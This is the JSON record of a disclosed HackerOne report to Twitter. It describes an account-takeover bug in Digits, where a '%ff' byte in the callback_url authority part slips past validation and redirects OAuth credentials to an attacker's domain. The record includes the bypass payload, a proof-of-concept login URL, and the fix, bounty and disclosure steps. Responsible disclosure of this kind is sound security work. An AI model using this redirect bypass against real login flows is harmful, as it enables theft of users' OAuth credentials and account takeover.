{"id":108113,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDgxMTM=","url":"https://hackerone.com/reports/108113","title":"Bypassing callback_url validation on Digits","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-01-04T16:49:58.642Z","submitted_at":"2016-01-04T16:49:58.642Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"filedescriptor","url":"/filedescriptor","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-08-12T20:34:31.579Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2016-07-13T20:34:17.690Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\nI would like to report an issue in Digits which allows attacker to bypass the *callback_url* validation of an application and thus takeover an account.\n\n#Detail\nDigits is a part of the Fabric SDK which offers phone-based sign in. It also provides web login flow. In the [navigation-based authentication flow](https://docs.fabric.io/web/digits/sign-in-options.html#callback-url), the OAuth credential data is passed to the specified callback URL (*callback_url*) after a user granted access to an application using HTTP 302 redirect. This parameter is supposed to be validated to match the registered domain of the application. Here's an example for Periscope:\n\n\u003e https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE\u0026host=https%3A%2F%2Fwww.digits.com\u0026callback_url=https://www.periscope.tv\n\ncallback_url=https://www.periscope.tv matches the application's registered domain, so no problem.\n\nIf we modify it:\n\u003e https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE\u0026host=https%3A%2F%2Fwww.digits.com\u0026callback_url=https://example.com\n\ncallback_url=https://example.com does not match the application's registered domain, thus the request is rejected.\n\nNow, it is noticed that the validation is rather loose. For example, it parses the URL and compares only the hostname part. In other words, a URL with authority part is allowed (e.g. callback_url=https://whatever@www.periscope.tv). It is still a solid validation because the hostname part is correctly handled (something like https://whatever\\@www.periscope.tv won't work). \n\nHowever, it is discovered that when outputting a non-ASCII character in the header, it will get converted to a question mark (?). **This happens after the validation.** Thus, attacker can bypass the validation by putting his/her own domain followed by a non-ASCII character in the authority part.\n\nHere's how it works:\n\nInput:\n``` \nhttps://attacker.com%ff@www.periscope.tv\n--------\\  authority   /\\   hostname   /\n```\n\nThe URL is parsed and passes the validation because the hostname matches the registered domain.\n\nOutput:\n``` \nhttps://attacker.com?@www.periscope.tv\n--------\\ hostname /-\\     query     /\n```\n\nSince the URL is outputted in the location header, %ff which is non-ASCII is converted. Now suddenly the hostname becomes attacker.com and everything after the question mark becomes the query part. Finally the victim will be redirected to attacker's site with victim's account's OAuth credential.\n\n#Impact\nIt affects every application that has integrated Digits, and even official application (Periscope). Attacker can abuse the flaw to login to victim's account on the affected applications.\n\n#PoC\n1. Prepare a Periscope account which is associated with a phone number\n2. Login to Periscope using the phone number with digits web login flow: https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE\u0026host=https%3A%2F%2Fwww.digits.com\u0026callback_url=https://innerht.ml%FF@www.periscope.tv\n3. After that your account will be renamed as \"Pwn3d\"\n\nVideo demo: https://vimeo.com/150671313 (password: token)\n\n#Fix\nThe *callback_url* should discard the authority part before outputting.","vulnerability_information_html":"\u003cp\u003eHi,\u003cbr\u003e\nI would like to report an issue in Digits which allows attacker to bypass the \u003cem\u003ecallback_url\u003c/em\u003e validation of an application and thus takeover an account.\u003c/p\u003e\n\n\u003ch1 id=\"detail\"\u003eDetail\u003c/h1\u003e\n\n\u003cp\u003eDigits is a part of the Fabric SDK which offers phone-based sign in. It also provides web login flow. In the \u003ca href=\"/redirect?url=https%3A%2F%2Fdocs.fabric.io%2Fweb%2Fdigits%2Fsign-in-options.html%23callback-url\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003enavigation-based authentication flow\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, the OAuth credential data is passed to the specified callback URL (\u003cem\u003ecallback_url\u003c/em\u003e) after a user granted access to an application using HTTP 302 redirect. This parameter is supposed to be validated to match the registered domain of the application. Here\u0026#39;s an example for Periscope:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca title=\"https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE\u0026amp;host=https%3A%2F%2Fwww.digits.com\u0026amp;callback_url=https://www.periscope.tv\" href=\"/redirect?url=https%3A%2F%2Fwww.digits.com%2Flogin%3Fconsumer_key%3D9I4iINIyd0R01qEPEwT9IC6RE%26host%3Dhttps%253A%252F%252Fwww.digits.com%26callback_url%3Dhttps%3A%2F%2Fwww.periscope.tv\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE\u0026amp;host=https%3A%2F%2Fwww.digits.com\u0026amp;callback_url=https://www.periscope.tv\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003ecallback_url=\u003ca title=\"https://www.periscope.tv\" href=\"/redirect?url=https%3A%2F%2Fwww.periscope.tv\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.periscope.tv\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e matches the application\u0026#39;s registered domain, so no problem.\u003c/p\u003e\n\n\u003cp\u003eIf we modify it:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca title=\"https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE\u0026amp;host=https%3A%2F%2Fwww.digits.com\u0026amp;callback_url=https://example.com\" href=\"/redirect?url=https%3A%2F%2Fwww.digits.com%2Flogin%3Fconsumer_key%3D9I4iINIyd0R01qEPEwT9IC6RE%26host%3Dhttps%253A%252F%252Fwww.digits.com%26callback_url%3Dhttps%3A%2F%2Fexample.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE\u0026amp;host=https%3A%2F%2Fwww.digits.com\u0026amp;callback_url=https://example.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003ecallback_url=\u003ca title=\"https://example.com\" href=\"/redirect?url=https%3A%2F%2Fexample.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://example.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e does not match the application\u0026#39;s registered domain, thus the request is rejected.\u003c/p\u003e\n\n\u003cp\u003eNow, it is noticed that the validation is rather loose. For example, it parses the URL and compares only the hostname part. In other words, a URL with authority part is allowed (e.g. callback_url=\u003ca title=\"https://whatever@www.periscope.tv\" href=\"/redirect?url=https%3A%2F%2Fwhatever%40www.periscope.tv\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://whatever@www.periscope.tv\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). It is still a solid validation because the hostname part is correctly handled (something like \u003ca title=\"https://whatever/@www.periscope.tv\" href=\"/redirect?url=https%3A%2F%2Fwhatever%2F%40www.periscope.tv\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://whatever/@www.periscope.tv\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e won\u0026#39;t work). \u003c/p\u003e\n\n\u003cp\u003eHowever, it is discovered that when outputting a non-ASCII character in the header, it will get converted to a question mark (?). \u003cstrong\u003eThis happens after the validation.\u003c/strong\u003e Thus, attacker can bypass the validation by putting his/her own domain followed by a non-ASCII character in the authority part.\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s how it works:\u003c/p\u003e\n\n\u003cp\u003eInput:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://attacker.com%ff@www.periscope.tv\n--------\\  authority   /\\   hostname   /\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe URL is parsed and passes the validation because the hostname matches the registered domain.\u003c/p\u003e\n\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://attacker.com?@www.periscope.tv\n--------\\ hostname /-\\     query     /\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince the URL is outputted in the location header, %ff which is non-ASCII is converted. Now suddenly the hostname becomes attacker.com and everything after the question mark becomes the query part. Finally the victim will be redirected to attacker\u0026#39;s site with victim\u0026#39;s account\u0026#39;s OAuth credential.\u003c/p\u003e\n\n\u003ch1 id=\"impact\"\u003eImpact\u003c/h1\u003e\n\n\u003cp\u003eIt affects every application that has integrated Digits, and even official application (Periscope). Attacker can abuse the flaw to login to victim\u0026#39;s account on the affected applications.\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePoC\u003c/h1\u003e\n\n\u003col\u003e\n\u003cli\u003ePrepare a Periscope account which is associated with a phone number\u003c/li\u003e\n\u003cli\u003eLogin to Periscope using the phone number with digits web login flow: \u003ca title=\"https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE\u0026amp;host=https%3A%2F%2Fwww.digits.com\u0026amp;callback_url=https://innerht.ml%FF@www.periscope.tv\" href=\"/redirect?url=https%3A%2F%2Fwww.digits.com%2Flogin%3Fconsumer_key%3D9I4iINIyd0R01qEPEwT9IC6RE%26host%3Dhttps%253A%252F%252Fwww.digits.com%26callback_url%3Dhttps%3A%2F%2Finnerht.ml%25FF%40www.periscope.tv\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE\u0026amp;host=https%3A%2F%2Fwww.digits.com\u0026amp;callback_url=https://innerht.ml%FF@www.periscope.tv\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eAfter that your account will be renamed as \u0026quot;Pwn3d\u0026quot;\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eVideo demo: \u003ca title=\"https://vimeo.com/150671313\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2F150671313\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/150671313\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (password: token)\u003c/p\u003e\n\n\u003ch1 id=\"fix\"\u003eFix\u003c/h1\u003e\n\n\u003cp\u003eThe \u003cem\u003ecallback_url\u003c/em\u003e should discard the authority part before outputting.\u003c/p\u003e\n","bounty_amount":"2520.0","formatted_bounty":"$2,520","weakness":{"id":53,"name":"Open Redirect"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-08-12T20:34:17.934Z","allow_singular_disclosure_after":-138181255.19234666,"singular_disclosure_allowed":true,"vote_count":47,"voters":["zhchbin","arneswinnen","sultancad","hunter","michiel","bogdantcaciuc","spam404","sameerphad72","0xsyndr0me","cuso4","and 37 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":741299,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eThank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-04T22:16:30.995Z","updated_at":"2016-01-04T22:16:30.995Z","actor":{"username":"arkadiyt","cleared":false,"url":"/arkadiyt","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":743530,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eWe consider this issue to be fixed now. Can you please confirm?\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-06T01:30:54.714Z","updated_at":"2016-01-06T01:30:54.714Z","actor":{"username":"arkadiyt","cleared":false,"url":"/arkadiyt","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"filedescriptor","url":"/filedescriptor"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":743659,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks like the authority part is now forbidden - confirmed fixed!","markdown_message":"\u003cp\u003eLooks like the authority part is now forbidden - confirmed fixed!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-06T04:40:53.705Z","updated_at":"2016-01-06T04:40:53.705Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":753912,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for helping us keep Twitter safe and secure for our users!","markdown_message":"\u003cp\u003eThanks again for helping us keep Twitter safe and secure for our users!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-11T23:17:08.998Z","updated_at":"2016-01-11T23:17:08.998Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"bounty_amount":"2520.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"filedescriptor","url":"/filedescriptor"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1067649,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"We are requesting public disclosure of this bug to encourage more reports of this quality. Thanks again!\n","markdown_message":"\u003cp\u003eWe are requesting public disclosure of this bug to encourage more reports of this quality. Thanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-13T20:34:17.844Z","updated_at":"2016-07-13T20:34:17.844Z","first_to_agree":true,"actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1124003,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-12T20:34:31.873Z","updated_at":"2016-08-12T20:34:31.873Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}